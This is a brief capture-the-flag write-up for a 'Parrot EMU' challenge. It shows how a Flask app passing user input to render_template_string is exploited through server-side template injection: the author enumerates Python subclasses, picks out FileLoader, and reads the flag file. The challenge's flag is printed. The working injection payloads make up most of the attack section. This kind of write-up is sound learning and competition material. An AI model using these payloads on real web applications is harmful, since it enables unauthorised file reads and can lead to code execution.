---
ai_date: 2025-04-27 05:15:40
ai_summary: Template injection exploiting 'FileLoader' to read flag
ai_tags:
  - template
  - template-injection
  - class-extraction
created: 2024-07-06T23:50
description: A template injection chat bot
points: 100
solves: 993
title: Parrot EMU
updated: 2025-07-14T09:46
---

```python
try:
	result = render_template_string(user_input)
except Exception as e:
	result = str(e)
```

Well, its template injection time.
## Template Injection

Code inside of templates, have a very limited context, they are missing `globals`.
So we have to find those classes.
### Find Classes
`{{''.__class__.__base__.__subclasses__()}}`
`''.__class__` is the `str` class, `<str>.__base__` is the `object` class, this payload will hence give us all available classes.

```python
# EMU REPLY:
`[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, ...

<class '_frozen_importlib_external.FileLoader'>,  # this is what we want to use
<class '_frozen_importlib_external._NamespacePath'>, 
...
<class 'werkzeug.debug.console.Console'>, <class 'werkzeug.debug.tbtools.Line'>, <class 'werkzeug.debug.tbtools.Traceback'>, <class 'werkzeug.debug.tbtools.Group'>, <class 'werkzeug.debug.tbtools.Frame'>, <class 'werkzeug.debug._ConsoleFrame'>, <class 'werkzeug.debug.DebuggedApplication'>]`
```

We will use `FileLoader` to read our flag.
`a.findIndex(a=>a.includes("File")) = 99`, we have determined that its the 99th item is the subclass list.

## Attack
`{{''.__class__.__base__.__subclasses__()[99]("flag", "flag").get_data("flag")}}`

This constructs a new `FileLoader` instance and reads the flag.

`DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}`

Simple stuff.